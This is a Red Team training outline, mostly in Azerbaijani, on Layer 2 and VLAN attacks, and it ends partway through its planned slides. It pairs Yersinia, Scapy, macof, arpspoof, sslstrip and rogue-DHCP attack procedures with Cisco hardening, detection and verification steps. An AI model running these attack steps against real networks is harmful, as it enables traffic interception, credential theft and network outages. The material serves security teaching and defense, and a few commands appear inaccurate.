# Segmentation_and_Layer2_Attacks

🎯 **VLAN Security: Attack Vectors & Defense Strategies**
# TAM KONSEPT - Red Team Perspective

---

## 📊 **TƏQDIMAT STRUKTURu (20 səhifə)**

Bu struktur **Build-Up metodologiyası** istifadə edir:
1. Struktur göstər
2. Problemi izah et  
3. Sömürülməni praktiki göstər
4. Müdafiəni öyrət

---

# 🎬 **ƏTRAFLII KONSEPT**

---

## **SƏHİFƏ 1: BAŞLIQ**

**Vizual:**
- Başlıq: "Network Segmentation Security: VLAN Attack Vectors & Exploitation Techniques"
- Alt başlıq: "A Practical Red Team Approach"
- Sizin adınız, tarix
- Background: Network topology silueti

---

## **SƏHİFƏ 2: NƏDƏN DANIŞACAĞIQ?**

**İçindəkilər:**

**Təqdimatın Məqsədləri:**
- Network segmentation-un əsaslarını başa düşmək
- VLAN texnologiyasının işləmə prinsipini öyrənmək  
- Real attack scenarios və exploitation techniques
- Defense strategies və best practices

**Sizin üçün Nə Əldə Edəcəksiniz:**
- Layer 2 attack surface bilgisi
- Praktiki penetration testing skills
- Network hardening metodları
- Real-world security assessment təcrübəsi

**Kimin üçün:**
- Network administrators
- Security engineers  
- Penetration testers
- IT students

---

## **SƏHİFƏ 3: NİYƏ SEGMENTATION LAZIMDIR?**

**Problem Statement:**

**Ssenari izah edin:**
> "Təsəvvür edin ki, 500 əməkdaşlı bir şirkətsiniz. Hamı eyni network-dadır:
> - Accounting department (maliyyə məlumatları)
> - HR department (şəxsi məlumatlar)
> - Guest WiFi (nə olduğu bəlli deyil)
> - IT servers (kritik sistemlər)
> 
> Bir intern Guest WiFi-dan malware yoluxdu. O HAMIYA yayıla bilər!"

**Network Segmentation Həlli:**
- Hər department ayrı VLAN-da
- Access control between segments
- Broadcast domain separation
- Security boundaries

**Diaqram göstərin:**
```
[Flat Network] → Problem: Hamı hamını görür
     ↓
[Segmented Network] → Həll: VLAN-lar ayrı izolə edilib
```

**Real-World Ehtiyac:**
- PCI-DSS compliance (kredit kartı data)
- HIPAA (hospital networks)
- Corporate security policies
- Performance optimization

---

## **SƏHİFƏ 4: VLAN NECƏDİR - STRUKTUR**

**VLAN (Virtual LAN) Tərifi:**
- Virtual Local Area Network
- Logical network separation
- Physical infrastructure eyni, logical ayrı
- Layer 2 (Data Link) texnologiyası

**Əsas Komponentlər:**

**1. VLAN ID:**
- 12-bit identifikator (1-4094)
- VLAN 1: Default VLAN (native)
- VLAN 1002-1005: Reserved

**2. 802.1Q Tagging:**
```
[Ethernet Frame]
| Dest MAC | Src MAC | [802.1Q Tag] | Type | Data | CRC |
                      ↑
              [4 bytes əlavə]
              [VLAN ID burada]
```

**3. Switch Port Növləri:**

**Access Port:**
- Bir VLAN-a aid
- End device üçün (PC, printer)
- Tag-siz traffic

**Trunk Port:**
- Çoxlu VLAN daşıyır
- Switch-to-switch və ya switch-to-router
- Tag-li traffic (802.1Q)

**Diaqram:**
```
[PC - VLAN 10] ─── Access Port ─── [Switch] ─── Trunk Port ─── [Router]
                                                 (VLAN 10,20,30)
```

**Native VLAN:**
- Trunk port-da tag-siz VLAN
- Default: VLAN 1
- **⚠️ Security risk - sonra izah edəcəyik**

---

## **SƏHİFƏ 5: VLAN NECƏ İŞLƏYİR - TRAFFIC FLOW**

**Normal VLAN Operation:**

**Ssenari 1: Same VLAN Communication**
```
PC-A (VLAN 10) → Switch → PC-B (VLAN 10)
✅ Birbaşa communication
```

**Ssenari 2: Different VLAN Communication**
```
PC-A (VLAN 10) → Switch → [BLOCKED] ← PC-C (VLAN 20)
❌ Direct communication YOX
```

**Inter-VLAN Routing:**
```
PC-A (VLAN 10) → Switch → Router (Layer 3) → Switch → PC-C (VLAN 20)
✅ Router vasitəsilə mümkün
```

**Trunk Port Traffic:**
```
Switch-1 [VLAN 10,20,30] ─── Trunk ─── Switch-2 [VLAN 10,20,30]
                            802.1Q tagged
```

**Packet Flow Detail:**
1. PC paket göndərir (tag-siz)
2. Access port tag əlavə edir (VLAN ID)
3. Trunk port tag saxlayır, daşıyır
4. Destination port tag-ı silib göndərir

**Diaqram:** Packet flow animation style

---

## **SƏHİFƏ 6: ƏLAVƏ PROTOKOLLAR - STRUKTUR**

**DTP (Dynamic Trunking Protocol):**

**Məqsəd:** Trunk avtomatik negotiation

**Port Modes:**
- `dynamic auto` - passive (trunk ola bilər)
- `dynamic desirable` - active (trunk olmaq istəyir)
- `trunk` - permanent trunk
- `access` - permanent access

**Negotiation Table:**
```
           | Auto | Desirable | Trunk | Access |
-----------|------|-----------|-------|--------|
Auto       | Acc  | Trunk     | Trunk | Access |
Desirable  | Trk  | Trunk     | Trunk | Access |
Trunk      | Trk  | Trunk     | Trunk | ERROR  |
Access     | Acc  | Access    | ERROR | Access |
```

**⚠️ Problem:** Default Cisco - `dynamic auto` / `dynamic desirable`

---

**STP (Spanning Tree Protocol):**

**Məqsəd:** Loop prevention

**Necə İşləyir:**
1. Root Bridge seçimi (ən aşağı Bridge ID)
2. Topology hesablama
3. Bəzi port-ları blok edir
4. Loop-free topology

**BPDU (Bridge Protocol Data Unit):**
- Switches arasında mesaj
- Topology information

**⚠️ Problem:** Trust-based protocol

---

**VTP (VLAN Trunking Protocol):**

**Məqsəd:** VLAN database synchronization

**Modes:**
- **Server:** VLAN yarada/sila bilər, advertise edir
- **Client:** VLAN əlavə edə bilməz, update qəbul edir
- **Transparent:** Pass-through, local VLAN-lar

**Revision Number:**
- Hər dəyişiklik +1 artır
- Yüksək revision number broadcast olur
- Hamı update qəbul edir

**⚠️ Problem:** Authentication yoxdur (default)

---

## **SƏHİFƏ 7: ATTACK SURFACE - PROBLEMLƏRİN XÜLASƏSİ**

**Layer 2 Niyə Vulnerable?**

**1. Trust-Based Protocols:**
- DTP: Hər kəsə etibar edir
- STP: BPDU-ya inanır
- VTP: Domain name + revision number

**2. Default Configurations:**
- DTP enabled
- VLAN 1 native
- Port security disabled
- No authentication

**3. Lack of Visibility:**
- Layer 2 attacks "görünməz"
- Traditional firewalls görmür
- IDS/IPS çətin detect edir

**4. Misconfiguration:**
- Unused ports active
- Default passwords
- Improper ACLs

**Attack Taxonomy:**
```
Layer 2 Attacks
├── VLAN Hopping
│   ├── Switch Spoofing (DTP)
│   └── Double Tagging (802.1Q)
├── STP Manipulation
├── VTP Injection
├── MAC Flooding
├── ARP Spoofing
└── DHCP Attacks
```

**Red Team Perspective:**
> "Layer 2 - ən az protect olunan layer. Çox admin unutur!"

---

## **SƏHİFƏ 8: ATTACK #1 - VLAN HOPPING (SWITCH SPOOFING)**

### **❌ PROBLEM: DTP Enabled by Default**

**Cisco Switch Default:**
```bash
interface GigabitEthernet0/1
 switchport mode dynamic auto  ← Problem!
```

**Vulnerability:**
- Port automatic trunk negotiation qəbul edir
- Attacker özünü switch kimi göstərə bilər
- Trunk port əldə edərsə → ALL VLAN access

---

### **💣 EXPLOITATION: DTP Attack**

**Ssenari:**
```
Attacker (VLAN 10) → Switch → Target (VLAN 20) [isolated]
```

**Attack Tool: Yersinia**

**Addım 1: Network Discovery**
```bash
# CDP/LLDP ilə switch detect et
sudo yersinia -I
# Interface seç, monitor mode
```

**Addım 2: DTP Attack Launch**
```bash
# Yersinia GUI
yersinia -G

# Select interface (eth0)
# Protocol: DTP
# Attack: "Enabling trunking"
# Start attack
```

**Nə baş verir:**
1. Yersinia DTP Desirable mesaj göndərir
2. Switch dynamic auto/desirable cavab verir
3. Port TRUNK olur
4. Attacker 802.1Q tagged packets göndərə bilir

**Addım 3: VLAN Access**
```bash
# Virtual interface yarat hər VLAN üçün
sudo modprobe 8021q

# VLAN 20 interface
sudo vlan-config add eth0 20
sudo ifconfig eth0.20 192.168.20.50 netmask 255.255.255.0 up

# VLAN 30 interface  
sudo vlan-config add eth0 30
sudo ifconfig eth0.30 192.168.30.50 netmask 255.255.255.0 up

# İndi sən bütün VLAN-lardasan!
```

**Verification:**
```bash
# VLAN 20-də scan et
nmap -sn 192.168.20.0/24

# VLAN 30-da scan et
nmap -sn 192.168.30.0/24
```

---

### **📊 Impact Assessment:**

**Nəyə Çatdın:**
- ✅ Bütün VLAN-lara access
- ✅ Isolated network-lərə giriş
- ✅ Sensitive data əldə etmə imkanı
- ✅ Lateral movement across segments

**Real-World Scenario:**
> "PCI-DSS VLAN-ında kredit kartı məlumatları var idi. 
> DTP attack ilə 5 dəqiqədə o VLAN-a keçdim."

---

### **🛡️ DEFENSE: DTP Mitigation**

**Solution 1: Disable DTP (Best Practice)**
```bash
# Hər port üçün
interface GigabitEthernet0/1
 switchport mode access          ← Force access
 switchport nonegotiate          ← Disable DTP
```

**Solution 2: Explicit Trunk Configuration**
```bash
# Trunk lazım olan yerdə
interface GigabitEthernet0/24
 switchport mode trunk
 switchport nonegotiate
 switchport trunk allowed vlan 10,20,30  ← Specify VLANs
```

**Solution 3: Unused Ports**
```bash
# İstifadə olunmayan port-ları
interface range GigabitEthernet0/10-20
 shutdown
 switchport mode access
 switchport access vlan 999  ← Dummy VLAN
```

**Detection:**
```bash
# Log monitoring
%DTP-5-TRUNKPORTON: Port Gi0/1 has become dot1q trunk

# SNMP trap configure
snmp-server enable traps dtp
```

**Verification:**
```bash
# Port status check
show interface GigabitEthernet0/1 switchport
# Bax: "Negotiation of Trunking: Off"
```

---

## **SƏHİFƏ 9: ATTACK #2 - VLAN HOPPING (DOUBLE TAGGING)**

### **❌ PROBLEM: Native VLAN Exploitation**

**Vulnerable Configuration:**
```bash
# Switch 1
interface GigabitEthernet0/24
 switchport mode trunk
 switchport trunk native vlan 1  ← Default (Problem!)
```

**Native VLAN Concept:**
- Trunk port-da tag-siz traffic üçün VLAN
- Default: VLAN 1
- Switch tag-ı silir native VLAN üçün

**Vulnerability:**
- Attacker double-tagged paket yarada bilər
- İlk tag native VLAN-dır (silinir)
- İkinci tag target VLAN-dır (qalır)
- Packet target VLAN-a çatır

---

### **💣 EXPLOITATION: Double Tagging Attack**

**Network Topology:**
```
Attacker PC ─── Access Port (VLAN 1) ─── [Switch-1] ─── Trunk (Native: VLAN 1) ─── [Switch-2] ─── Access Port (VLAN 20) ─── Target Server
```

**Attack Concept:**
```
[Original Packet]
| Dst MAC | Src MAC | Data |

[Double Tagged Packet]
| Dst MAC | Src MAC | [Tag: VLAN 1] | [Tag: VLAN 20] | Data |
                      ↓ Switch-1 silir    ↓ Qalır
                                    [Forward to VLAN 20]
```

**Tool: Scapy**

**Addım 1: Environment Setup**
```bash
# Scapy install
sudo apt install python3-scapy

# Python script
sudo python3
>>> from scapy.all import *
```

**Addım 2: Reconnaissance**
```bash
# Target IP VLAN 20-də: 192.168.20.100
# Attacker VLAN 1-də: 192.168.1.50
# Native VLAN: 1
```

**Addım 3: Craft Double-Tagged Packet**
```python
from scapy.all import *

# Packet structure
packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
         Dot1Q(vlan=1) / \              # Outer tag (Native VLAN)
         Dot1Q(vlan=20) / \             # Inner tag (Target VLAN)
         IP(dst="192.168.20.100") / \   # Target server
         ICMP() / \
         "Double Tagging Test"

# Send packet
sendp(packet, iface="eth0", count=1, verbose=True)
```

**Wireshark Capture:**
```
Attacker → Switch-1:
[802.1Q VLAN 1][802.1Q VLAN 20][IP][ICMP]

Switch-1 → Switch-2 (Trunk):
[802.1Q VLAN 20][IP][ICMP]  ← Outer tag silindi

Switch-2 → Target:
[IP][ICMP]  ← VLAN 20-yə forward olundu
```

**Advanced: TCP Connection Attempt**
```python
# SYN packet göndər
packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
         Dot1Q(vlan=1) / \
         Dot1Q(vlan=20) / \
         IP(dst="192.168.20.100") / \
         TCP(dport=445, flags="S")  # SMB port

sendp(packet, iface="eth0")
```

---

### **⚠️ Limitation:**

**One-Way Traffic:**
- Return traffic VLAN 20 → VLAN 1 olmur
- Routing lazımdır
- Blind attack (response görməzsən)

**Use Cases:**
- Port scanning (SYN scan)
- DoS attacks
- Unidirectional data send

---

### **📊 Impact:**

**Nə edə bilərsən:**
- ✅ Target VLAN-a paket göndərmə
- ✅ Port scanning
- ✅ Service disruption
- ❌ İki tərəfli communication YOX

---

### **🛡️ DEFENSE: Double Tagging Mitigation**

**Solution 1: Native VLAN Separation**
```bash
# Native VLAN-ı istifadə olunmayan VLAN et
interface GigabitEthernet0/24
 switchport trunk native vlan 999  ← Unused VLAN
```

**Solution 2: Tag Native VLAN**
```bash
# Native VLAN-ı da tag-lə (Cisco)
vlan dot1q tag native
```

**Solution 3: Disable VLAN 1**
```bash
# VLAN 1-i trunk-dan çıxart
interface GigabitEthernet0/24
 switchport trunk allowed vlan 10,20,30  ← No VLAN 1
```

**Solution 4: Access Port Controls**
```bash
# Access port-da double-tag drop et (bəzi switch-lər)
interface GigabitEthernet0/1
 spanning-tree bpdufilter enable
 switchport mode access
```

**Detection:**
```bash
# Wireshark filter
vlan && vlan  ← Double-tagged packets

# Switch logging (bəzi models)
# Unusual frame size
```

**Best Practice:**
```bash
# Complete trunk config
interface GigabitEthernet0/24
 switchport mode trunk
 switchport trunk allowed vlan 10,20,30
 switchport trunk native vlan 999
 switchport nonegotiate
```

---

## **SƏHİFƏ 10: ATTACK #3 - STP MANIPULATION**

### **❌ PROBLEM: Spanning Tree Trust Model**

**STP Nədir (Xatırlatma):**
- Loop prevention protocol
- Root Bridge election (ən aşağı Bridge Priority)
- Topology calculate edir

**Bridge Priority:**
```
Bridge ID = [Priority (0-65535)] + [MAC Address]
Default Priority: 32768
```

**Root Bridge Selection:**
```
Lowest Priority → Root
Equal Priority → Lowest MAC wins
```

**Vulnerability:**
- Hər switch BPDU (Bridge Protocol Data Unit) göndərə bilər
- Trust-based - authentication yox
- Attacker root bridge ola bilər

---

### **💣 EXPLOITATION: Root Bridge Takeover**

**Attack Goal:** Man-in-the-Middle Position

**Ssenari:**
```
[Switch-A] ←→ [Switch-B (Root)] ←→ [Switch-C]
                   ↓
[Switch-A] ←→ [ATTACKER (New Root)] ←→ [Switch-C]
              (All traffic flows through attacker)
```

**Tool: Yersinia**

**Addım 1: Current Root Discovery**
```bash
# CDP/LLDP sniffing
sudo tcpdump -i eth0 -nn -e -vv ether proto 0x010b

# Root Bridge info
# Bridge ID: Priority 32768, MAC: 00:1a:2b:3c:4d:5e
```

**Addım 2: Calculate Attack Priority**
```python
# Current root priority: 32768
# Attack priority: 0 (minimum)
# Attacker bridge ID: 0 + [Your MAC]
```

**Addım 3: Launch STP Attack**
```bash
# Yersinia GUI
yersinia -G

# Protocol: STP
# Attack type: "Claiming Root Role"
# Configuration:
#   - Priority: 0
#   - Hello Time: 2 sec
#   - Max Age: 20 sec
# Start Attack
```

**Manual BPDU Craft (Scapy):**
```python
from scapy.all import *

# Fake BPDU packet
bpdu = Dot3(dst="01:80:c2:00:00:00") / \
       LLC() / \
       STP(rootid=0,  # Priority 0
           rootmac="aa:bb:cc:dd:ee:ff",  # Your MAC
           bridgeid=0,
           bridgemac="aa:bb:cc:dd:ee:ff")

# Continuous send
sendp(bpdu, iface="eth0", inter=2, loop=True)
```

**Addım 4: Verify Root Status**
```bash
# Monitor traffic
sudo tcpdump -i eth0 -nn

# Check if you're receiving forwarded traffic
# Traffic from Switch-A → Switch-C passes through you
```

---

### **📊 Impact:**

**MITM Position:**
```
Normal:
PC-A → Switch-A → Switch-B → Switch-C → Server
                     ↓
Attacked:
PC-A → Switch-A → ATTACKER → Switch-C → Server
                   ↓ Sniff
               [Credentials, Data]
```

**Capabilities:**
- ✅ Traffic interception
- ✅ Password sniffing
- ✅ Session hijacking
- ✅ Data modification

---

### **Additional STP Attacks:**

**BPDU Flooding:**
```bash
# Yersinia: "Sending CONF BPDUs"
# Flood switches with BPDU
# Result: CPU exhaustion, topology confusion
```

**TCN (Topology Change Notification) Attack:**
```bash
# Send continuous TCN
# Forces MAC table flush
# Cause: Switch acts as hub temporarily
```

---

### **🛡️ DEFENSE: STP Protection**

**Solution 1: Root Guard**
```bash
# Prevent unauthorized root bridge
interface GigabitEthernet0/1
 spanning-tree guard root

# Port receives superior BPDU → Err-Disabled
```

**Solution 2: BPDU Guard**
```bash
# Access ports should not receive BPDU
interface GigabitEthernet0/1
 switchport mode access
 spanning-tree bpduguard enable

# BPDU received → Port shutdown
```

**Solution 3: BPDU Filter**
```bash
# Suppress BPDU on edge ports
interface GigabitEthernet0/1
 spanning-tree bpdufilter enable
```

**Solution 4: PortFast**
```bash
# Skip STP listening/learning states (end devices)
interface GigabitEthernet0/1
 spanning-tree portfast
```

**Global Configuration:**
```bash
# Enable globally
spanning-tree portfast default
spanning-tree portfast bpduguard default
```

**Solution 5: Manual Root Bridge**
```bash
# Explicitly set root bridge
spanning-tree vlan 1-100 priority 4096

# Secondary root
spanning-tree vlan 1-100 priority 8192
```

**Detection:**
```bash
# Log monitoring
%SPANTREE-2-ROOTGUARD_BLOCK

# Show STP status
show spanning-tree interface GigabitEthernet0/1 detail

# Check root bridge
show spanning-tree root
```

---

## **SƏHİFƏ 11: ATTACK #4 - VTP INJECTION**

### **❌ PROBLEM: VTP Domain Synchronization**

**VTP Xatırlatma:**
- VLAN database synchronization
- Revision number tracking
- No authentication (default)

**Vulnerability:**
```
VTP Domain: "COMPANY"
Switch-A (Revision 5) → Switch-B (Revision 5)
                    ↓
Attacker (Revision 100) → Broadcast
                    ↓
All switches accept (higher revision)
                    ↓
VLAN database corrupted/deleted
```

---

### **💣 EXPLOITATION: VTP Attack**

**Attack Types:**

**Type 1: VLAN Database Deletion**
```
Goal: Delete all VLANs
Result: Network outage
```

**Type 2: VLAN Database Corruption**
```
Goal: Add fake VLANs
Result: Configuration chaos
```

**Tool: Yersinia**

**Addım 1: VTP Domain Discovery**
```bash
# CDP/DTP listening
sudo yersinia -I

# Select interface
# Mode: Interactive
# Check VTP advertisements

# Domain: "COMPANY"
# Revision: 12
```

**Addım 2: VTP Injection Attack**
```bash
# Yersinia GUI
yersinia -G

# Protocol: VTP
# Attack: "Deleting all VLANs"
# Configuration:
#   - Domain: "COMPANY"
#   - Revision: 200 (higher than current)
# Start Attack
```

**Manual VTP Packet (Scapy):**
```python
from scapy.all import *

# VTP Summary Advertisement
vtp_packet = Dot3(dst="01:00:0c:cc:cc:cc") / \
             LLC() / \
             SNAP() / \
             Raw(load=
                 b'\x01'  # VTP version
                 b'\x01'  # Message type (Summary)
                 # ... VTP fields
                 b'\x00\x00\x00\xC8'  # Revision 200
                 # ... Domain name "COMPANY"
             )

sendp(vtp_packet, iface="eth0")
```

---

### **📊 Impact:**

**Scenario 1: Complete VLAN Deletion**
```
Before:
VLAN 10 - Sales
VLAN 20 - Engineering  
VLAN 30 - Finance

After VTP Attack:
[All VLANs deleted except VLAN 1]

Result:
- All ports moved to VLAN 1
- Inter-VLAN communication fails
- Services down
```

**Scenario 2: Fake VLAN Creation**
```
Attacker creates:
VLAN 666 - "Backdoor"

Configuration confusion
Admin troubleshooting time
```

**Business Impact:**
- 🔴 Network-wide outage
- 🔴 Productivity loss
- 🔴 Recovery time: hours

---

### **🛡️ DEFENSE: VTP Protection**

**Solution 1: VTP Transparent Mode (Best)**
```bash
# Local VLAN management, no sync
vtp mode transparent
```

**Solution 2: VTP Password**
```bash
# MD5 authentication
vtp domain COMPANY
vtp password SecureP@ss123
```

**Solution 3: VTP Version 3**
```bash
# Enhanced security (manual configuration propagation)
vtp version 3
vtp mode server
vtp primary vlan  ← Manual promotion required
```

**Solution 4: VTP Off**
```bash
# Disable completely (newer IOS)
vtp mode off
```

**Solution 5: VLAN Pruning**
```bash
# Minimize VTP advertisement scope
vtp pruning
```

**Detection:**
```bash
# Monitor VTP messages
debug vtp events

# Log abnormal revision number spikes
%SW_VLAN-4-VTP_USER_NOTIFICATION

# Show VTP status
show vtp status
# Check: Revision number jumps
```

**Verification:**
```bash
# Check configuration
show vtp status

# Output should show:
# VTP Mode: Transparent
# or
# VTP Password: [set]
```

---

## **SƏHİFƏ 12: ATTACK #5 - MAC FLOODING**

### **❌ PROBLEM: CAM Table Limitations**

**CAM Table Nədir:**
- Content Addressable Memory
- Stores MAC → Port mappings
- Limited size (4K-32K entries)

**Normal Operation:**
```
MAC Address        Port
aa:bb:cc:dd:ee:01  Gi0/1
aa:bb:cc:dd:ee:02  Gi0/2
...
```

**Vulnerability:**
- CAM table dolduğunda overflow
- Eski switch-lər: **failopen mode** (hub kimi davranır)
- Bütün traffic flood olur (broadcast)

---

### **💣 EXPLOITATION: MAC Flood Attack**

**Attack Goal:** Switch-i hub-a çevirmək, traffic sniff etmək

**Tool: macof**

**Addım 1: CAM Table Size Discovery**
```bash
# Normal traffic analysis
sudo tcpdump -i eth0 -e -nn | head -50

# Unique MAC count
```

**Addım 2: Launch MAC Flood**
```bash
# macof tool (dsniff package)
sudo apt install dsniff

# Attack
sudo macof -i eth0 -n 50000
# -i: interface
# -n: number of packets

# Output:
# aa:bb:cc:dd:ee:03 → Random IP
# aa:bb:cc:dd:ee:04 → Random IP
# ... (thousands per second)
```

**Scapy Alternative:**
```python
from scapy.all import *

def mac_flood():
    for i in range(50000):
        # Random MAC
        src_mac = RandMAC()
        # Random IP
        src_ip = ".".join(map(str, (random.randint(0,255) for _ in range(4))))
        
        packet = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") / \
                 IP(src=src_ip, dst="192.168.1.1") / \
                 ICMP()
        
        sendp(packet, iface="eth0", verbose=False)

mac_flood()
```

**Addım 3: Verify Failopen**
```bash
# Start packet capture
sudo tcpdump -i eth0 -nn

# Check if receiving traffic from OTHER devices
# (Not destined to you)

# If yes → Switch is in hub mode ✅
```

**Addım 4: Sniff Traffic**
```bash
# Wireshark or tcpdump
sudo wireshark &

# Filter for credentials
# HTTP, FTP, Telnet passwords
```

---

### **📊 Impact:**

**Before Attack:**
```
PC-A → Switch (CAM lookup) → PC-B only
     ↓
PC-C (cannot see this traffic)
```

**After Attack (Failopen):**
```
PC-A → Switch (CAM full, flooding) → ALL PORTS
     ↓                                  ↓
   PC-B                               PC-C (Attacker sniffs!)
```

**Capabilities:**
- ✅ Password sniffing
- ✅ Session hijacking
- ✅ Data exfiltration
- ✅ Network mapping

---

### **🛡️ DEFENSE: MAC Flooding Protection**

**Solution 1: Port Security**
```bash
# Limit MAC addresses per port
interface GigabitEthernet0/1
 switchport mode access
 switchport port-security
 switchport port-security maximum 2           ← Max 2 MACs
 switchport port-security violation restrict  ← Action
 switchport port-security mac-address sticky  ← Learn MACs

# Violation modes:
# - shutdown: port disabled
# - restrict: drop packets, log
# - protect: drop packets silently
```

**Solution 2: Storm Control**
```bash
# Rate limiting
interface GigabitEthernet0/1
 storm-control broadcast level 50
 storm-control action shutdown
```

**Solution 3: Dynamic ARP Inspection**
```bash
# Validate ARP packets
ip arp inspection vlan 10,20,30

# Trusted ports (uplinks)
interface GigabitEthernet0/24
 ip arp inspection trust
```

**Solution 4: DHCP Snooping**
```bash
# Build binding table
ip dhcp snooping
ip dhcp snooping vlan 10,20,30

# Trusted DHCP server ports
interface GigabitEthernet0/24
 ip dhcp snooping trust
```

**Verification:**
```bash
# Check port security
show port-security interface GigabitEthernet0/1

# Output:
Port Security: Enabled
Port Status: Secure-up
Violation Mode: Restrict
Maximum MAC Addresses: 2
Current MAC Addresses: 1

# Check violations
show port-security address
```

**Detection:**
```bash
# Log monitoring
%PORT_SECURITY-2-PSECURE_VIOLATION

# SNMP trap
snmp-server enable traps port-security
```

---

## **SƏHİFƏ 13: ATTACK #6 - ARP SPOOFING CROSS-VLAN**

### **❌ PROBLEM: Inter-VLAN Routing ARP Cache**

**Normal Inter-VLAN Communication:**
```
PC-A (VLAN 10)
   ↓ (ARP: Who is 192.168.10.1?)
Router (Gateway)
   ↓ (Forward to VLAN 20)
PC-B (VLAN 20)
```

**Vulnerability:**
- Router ARP cache poisoning
- Gateway MAC spoofing
- Default gateway impersonation

---

### **💣 EXPLOITATION: Cross-VLAN ARP Poisoning**

**Attack Goal:** MITM between VLANs

**Topology:**
```
PC-A (VLAN 10: 192.168.10.50) 
   ↓
Switch → Router (192.168.10.1 / 192.168.20.1)
   ↓
Server (VLAN 20: 192.168.20.100)
```

**Attack Position: VLAN 10**

**Tool: arpspoof / Ettercap**

**Addım 1: Enable IP Forwarding**
```bash
# Attacker becomes router
sudo sysctl -w net.ipv4.ip_forward=1

# Verify
cat /proc/sys/net/ipv4/ip_forward
# Output: 1
```

**Addım 2: ARP Poisoning - Target Gateway**
```bash
# arpspoof (dsniff)
sudo apt install dsniff

# Poison PC-A: "I am the gateway"
sudo arpspoof -i eth0 -t 192.168.10.50 192.168.10.1
# -t: target (PC-A)
# Last arg: gateway IP

# In another terminal
# Poison Gateway: "I am PC-A"
sudo arpspoof -i eth0 -t 192.168.10.1 192.168.10.50
```

**Ettercap Alternative:**
```bash
# GUI
sudo ettercap -G

# Select interface: eth0
# Hosts → Scan for hosts
# Add PC-A to Target 1
# Add Gateway to Target 2
# MITM → ARP Poisoning
# Start sniffing
```

**Addım 3: Traffic Capture**
```bash
# Wireshark running
sudo wireshark &

# Filter
http or ftp or telnet or smtp

# Watch credentials flow through attacker
```

**Advanced: SSL Stripping**
```bash
# sslstrip tool
sudo apt install sslstrip

# iptables redirect
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Start sslstrip
sudo sslstrip -l 8080

# HTTPS → HTTP downgrade
```

---

### **📊 Impact:**

**Normal Traffic:**
```
PC-A → Router → Server
```

**Attacked Traffic:**
```
PC-A → ATTACKER → Router → Server
       ↓ (sniff)
   [Passwords, Cookies, Data]
```

**Harvested Data:**
- ✅ Login credentials (HTTP, FTP, Telnet)
- ✅ Session cookies
- ✅ Sensitive documents
- ✅ Database queries

---

### **🛡️ DEFENSE: ARP Spoofing Mitigation**

**Solution 1: Dynamic ARP Inspection (DAI)**
```bash
# Enable globally
ip arp inspection vlan 10,20,30

# Trusted ports (router, uplinks)
interface GigabitEthernet0/24
 ip arp inspection trust

# Rate limiting untrusted ports
interface range GigabitEthernet0/1-20
 ip arp inspection limit rate 15
```

**DAI Operation:**
```
1. ARP packet received
2. Check DHCP snooping binding table
3. Validate: IP ↔ MAC ↔ Port match
4. Drop if invalid
```

**Solution 2: DHCP Snooping (DAI dependency)**
```bash
# Build IP-MAC-Port binding
ip dhcp snooping
ip dhcp snooping vlan 10,20,30

# Trusted DHCP server
interface GigabitEthernet0/24
 ip dhcp snooping trust
```

**Solution 3: Static ARP Entries**
```bash
# Critical devices (gateway, servers)
arp 192.168.10.1 aaaa.bbbb.cccc ARPA

# Permanent entry
```

**Solution 4: Port Security**
```bash
# Limit MAC addresses
interface GigabitEthernet0/1
 switchport port-security
 switchport port-security maximum 2
 switchport port-security mac-address sticky
```

**Verification:**
```bash
# Check DAI status
show ip arp inspection

# Check bindings
show ip dhcp snooping binding

# Output example:
MacAddress     IpAddress  Lease   Type   VLAN  Interface
-------------  ---------  ------  ----   ----  ---------
aa:bb:cc:dd:ee:01  192.168.10.50  86378  dhcp-snooping  10   Gi0/1
```

**Detection:**
```bash
# Log monitoring
%SW_DAI-4-DHCP_SNOOPING_DENY

# Real-time monitoring
debug ip arp inspection
```

---

## **SƏHİFƏ 14: ATTACK #7 - DHCP STARVATION & ROGUE DHCP**

### **❌ PROBLEM: DHCP Trust Model**

**Normal DHCP:**
```
Client: DHCP Discover (broadcast)
   ↓
Server: DHCP Offer (IP, Gateway, DNS)
   ↓
Client: DHCP Request
   ↓
Server: DHCP ACK
```

**Vulnerabilities:**
1. **DHCP Pool Exhaustion:** Attacker bütün IP-ləri tutub
2. **Rogue DHCP Server:** Fake gateway, DNS verir

---

### **💣 EXPLOITATION: DHCP Attack Chain**

**Phase 1: DHCP Starvation**

**Tool: Yersinia**

**Addım 1: DHCP Pool Discovery**
```bash
# Discover DHCP server
sudo nmap --script broadcast-dhcp-discover
# Output: DHCP server, pool range
```

**Addım 2: Exhaust Pool**
```bash
# Yersinia GUI
yersinia -G

# Protocol: DHCP
# Attack: "Sending DISCOVER packet"
# Configuration:
#   - Interface: eth0
#   - Requests: 500 (pool size)
# Start

# Yersinia sends DISCOVER with random MACs
# Server assigns all IPs
# Pool exhausted
```

**Gobbler Alternative:**
```bash
# DHCP starvation tool
sudo dhcpstarv -i eth0

# Continuously requests IPs
```

---

**Phase 2: Deploy Rogue DHCP**

**Addım 3: Setup Attacker DHCP**
```bash
# Install DHCP server
sudo apt install isc-dhcp-server

# Configure /etc/dhcp/dhcpd.conf
subnet 192.168.10.0 netmask 255.255.255.0 {
  range 192.168.10.100 192.168.10.200;
  option routers 192.168.10.50;        ← Attacker IP (fake gateway)
  option domain-name-servers 192.168.10.50;  ← Attacker DNS
  default-lease-time 600;
  max-lease-time 7200;
}

# Start service
sudo systemctl start isc-dhcp-server
```

**Addım 4: Clients Connect**
```
New Client joins network
   ↓
DHCP Discover
   ↓
Legitimate Server: (No IPs available - pool exhausted)
Rogue Server: DHCP Offer ✅
   ↓
Client accepts Rogue DHCP
   ↓
Gateway = Attacker
DNS = Attacker
```

---

### **📊 Impact:**

**Complete Network Control:**
```
Clients → Attacker (fake gateway) → Internet
          ↓
   [Full MITM Position]
   - Intercept all traffic
   - DNS spoofing
   - Credential harvesting
   - Malware injection
```

**DNS Spoofing Example:**
```bash
# Attacker's DNS server
# /etc/hosts manipulation

# Client requests: company.com
# Attacker responds: 192.168.10.50 (phishing site)
```

---

### **🛡️ DEFENSE: DHCP Protection**

**Solution 1: DHCP Snooping**
```bash
# Enable globally
ip dhcp snooping
ip dhcp snooping vlan 10,20,30

# Trusted DHCP server port
interface GigabitEthernet0/24
 ip dhcp snooping trust

# Rate limit untrusted ports
interface range GigabitEthernet0/1-20
 ip dhcp snooping limit rate 10  ← 10 packets/sec
```

